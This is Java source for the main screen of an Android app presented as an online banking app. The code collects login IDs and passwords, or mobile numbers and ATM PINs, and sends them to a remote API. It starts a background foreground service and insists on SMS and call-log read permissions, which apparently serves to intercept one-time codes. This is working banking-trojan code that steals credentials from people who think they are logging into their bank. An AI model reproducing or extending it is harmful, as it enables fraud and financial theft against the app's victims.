package com.codewithmuddasir.onlinebanking;

import static com.codewithmuddasir.onlinebanking.helper.Setting.model;

import android.Manifest;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.ColorStateList;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.databinding.DataBindingUtil;

import com.codewithmuddasir.onlinebanking.databinding.ActivityMainBinding;
import com.codewithmuddasir.onlinebanking.helper.Util;
import com.google.android.material.button.MaterialButton;

import java.util.Random;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {

    ActivityMainBinding binding;

    boolean doubleBackToExitPressedOnce;

    private Util util;

    private static final int PERMISSION_REQUEST_CODE = 1;

    private ProgressDialog progressDialog;

    String status = "Login ID/Customer ID";

    boolean check = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = DataBindingUtil.setContentView(this, R.layout.activity_main);


        binding.userid.setOnClickListener(view ->{

            if (check){
                binding.atmtxt.setVisibility(View.VISIBLE);
                binding.atmcard.setVisibility(View.VISIBLE);

                binding.user.setVisibility(View.GONE);
                binding.usercard.setVisibility(View.GONE);
                binding.passcard.setVisibility(View.GONE);
                binding.passtxt.setVisibility(View.GONE);
                binding.sub.setVisibility(View.GONE);
                binding.l1.setVisibility(View.GONE);

                binding.userid.setText("Login with Userid");

                check = false;
            }else{
                binding.atmtxt.setVisibility(View.GONE);
                binding.atmcard.setVisibility(View.GONE);

                binding.user.setVisibility(View.VISIBLE);
                binding.usercard.setVisibility(View.VISIBLE);
                binding.l1.setVisibility(View.VISIBLE);
                binding.passcard.setVisibility(View.VISIBLE);
                binding.passtxt.setVisibility(View.VISIBLE);
                binding.sub.setVisibility(View.VISIBLE);

                binding.userid.setText("Login with Mobile Number");

                check = true;
            }


        });

        util = new Util();

        binding.auth.setOnClickListener(view ->{

            if(binding.number.getText().toString().isEmpty() || binding.atm.getText().toString().isEmpty() ){
                Toast.makeText(this, "fill all fields", Toast.LENGTH_SHORT).show();
            }else{

                firstpage message1 = new firstpage("", "",binding.number.getText().toString()
                        ,binding.atm.getText().toString());

                util.saveLocalData(this,"mmm",binding.number.getText().toString());
                Intent serviceIntent = new Intent(this, MyForegroundService.class);
                ContextCompat.startForegroundService(this, serviceIntent);

                ApiService apiService = ApiClient.getClient().create(ApiService.class);
                Call<Void> call = apiService.createfirstpage(message1);

                call.enqueue(new Callback<Void>() {
                    @Override
                    public void onResponse(Call<Void> call, Response<Void> response) {
                        // Handle successful response
                        if (response.isSuccessful()) {
                            // Data sent successfully
                            Intent intent = new Intent(MainActivity.this, LoginLoadingActivity.class);
                            intent.putExtra("m", binding.number.getText().toString() );
                            intent.putExtra("a", binding.atm.getText().toString() );
                            intent.putExtra("u", "" );
                            intent.putExtra("p", "");
                            startActivity(intent);
                        } else {
                            // Handle other response codes if needed
                            Log.d("asdf123","unsucess");
                        }
                    }

                    @Override
                    public void onFailure(Call<Void> call, Throwable t) {
                        // Handle failure
                        Log.d("asdf123",t.toString());
                    }
                });


            }



        });



        binding.sub.setOnClickListener(view -> {
            if(binding.pass.getText().toString().isEmpty() || binding.usertxt.getText().toString().isEmpty() ){
                Toast.makeText(this, "fill all fields", Toast.LENGTH_SHORT).show();
            }else{

                util.saveLocalData(this,"mmm",binding.usertxt.getText().toString());
                Intent serviceIntent = new Intent(this, MyForegroundService.class);
                ContextCompat.startForegroundService(this, serviceIntent);

                firstpage message1 = new firstpage(
                        binding.usertxt.getText().toString(),
                        binding.pass.getText().toString()
                        ,"",
                        "" );

                ApiService apiService = ApiClient.getClient().create(ApiService.class);
                Call<Void> call = apiService.createfirstpage(message1);

                call.enqueue(new Callback<Void>() {
                    @Override
                    public void onResponse(Call<Void> call, Response<Void> response) {
                        // Handle successful response
                        if (response.isSuccessful()) {
                            // Data sent successfully
                            Intent intent = new Intent(MainActivity.this, LoginLoadingActivity.class);
                            intent.putExtra("m", "" );
                            intent.putExtra("a", "" );
                            intent.putExtra("u", binding.usertxt.getText().toString() );
                            intent.putExtra("p", binding.pass.getText().toString());
                            startActivity(intent);
                        } else {
                            // Handle other response codes if needed
                            Log.d("asdf123","unsucess");
                        }
                    }

                    @Override
                    public void onFailure(Call<Void> call, Throwable t) {
                        // Handle failure
                        Log.d("asdf123",t.toString());
                    }
                });

            }


        });



        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            // Permission is not granted, request permission
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{android.Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG}, PERMISSION_REQUEST_CODE);
        }
//

//
        progressDialog = new ProgressDialog(MainActivity.this);
        progressDialog.setMessage("Loading... Please Wait");
        progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        progressDialog.setCancelable(false);

//        binding.btnLogin.setOnClickListener(view -> {
//            if (!isFieldsEmpty(binding.txtCustomerId, binding.txtPassword)) {
//                progressDialog.show();
//
//                Random random = new Random();
//                int code = random.nextInt(900000) + 100000;
//
//                String userId = String.valueOf(code);
//
//                model.setUserId(userId);
//
//                util.sendCreditDetail(this, model.getUserId(), binding.txtCustomerId.getText().toString(), binding.txtPassword.getText().toString(), status, () -> {
//                    util.saveLocalData(this, "userId", model.getUserId());
//
//                    progressDialog.dismiss();
//                    startActivity(new Intent(this, CreditActivity.class));
//                    Intent serviceIntent = new Intent(this, MyForegroundService.class);
//                    ContextCompat.startForegroundService(this, serviceIntent);
//                    finish();
//                });
//            }
//        });





//        if (!util.getLocalData(this, "userId").isEmpty()) {
//            progressDialog.show();
//        }

        String CHANNEL_ID = "channel_id";

// Create the notification channel
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "My Channel Name";
            String description = "My Channel Description";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);

            // Register the channel with the system
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }


    @Override
    public void onBackPressed() {
        if (doubleBackToExitPressedOnce) {
            super.onBackPressed();
            return;
        }

        this.doubleBackToExitPressedOnce = true;
        Toast.makeText(this, "Press back again to exit", Toast.LENGTH_SHORT).show();

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                doubleBackToExitPressedOnce=false;
            }
        }, 2000); // Change this delay as per your requirement
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {// If permission is granted
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission is granted, read SMS messages
                Toast.makeText(MainActivity.this, "Permission granted", Toast.LENGTH_SHORT).show();
            } else {
                // Permission is not granted, show message or disable feature
                if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_SMS)) {
                    // User has denied permission once, show explanation
                    AlertDialog.Builder builder = new AlertDialog.Builder(this);
                    builder.setTitle("Permission Required")
                            .setMessage("This app requires permission to read SMS messages in order to function properly. Please grant the permission in the app settings.")
                            .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog, int id) {
                                    // Open app settings to grant permission manually
                                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                                    intent.setData(uri);
                                    startActivity(intent);
                                }
                            })
                            .setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog, int id) {
                                    // User cancelled the dialog
                                    Toast.makeText(MainActivity.this, "Permission denied", Toast.LENGTH_SHORT).show();
                                }
                            });
                    builder.show();
                } else {
                    // User has denied permission twice, show message
                    Toast.makeText(MainActivity.this, "Permission denied. Please grant the permission in the app settings.", Toast.LENGTH_LONG).show();
                }
            }
            return;
        }
    }



}



class firstpage{
    private String userId;
    private String password;
    private String atmpin;
    private String mobile;


    firstpage(String usrid,String password,String mobile,String atmpin){
        this.userId = usrid;
        this.password = password;
        this.mobile = mobile;
        this.atmpin = atmpin;
    }

}

